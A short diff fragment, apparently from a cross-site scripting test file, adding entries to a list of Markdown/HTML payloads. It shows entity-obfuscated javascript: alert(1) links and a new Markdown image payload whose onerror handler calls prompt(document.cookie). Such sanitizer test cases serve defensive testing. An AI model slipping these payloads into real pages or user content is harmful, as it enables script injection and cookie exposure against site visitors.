@@ -21,3 +21,5 @@ https://raw.githubusercontent.com/runcom/SATraining/master/index.html
 > &#61;"javascript&#58this;alert(1&#41;">*you*</a>
 
 3. &#61;"javascript&#58this;alert(1&#41;">*you*</a>
+4. 
+![a'"`onerror=prompt(document.cookie)](x)\
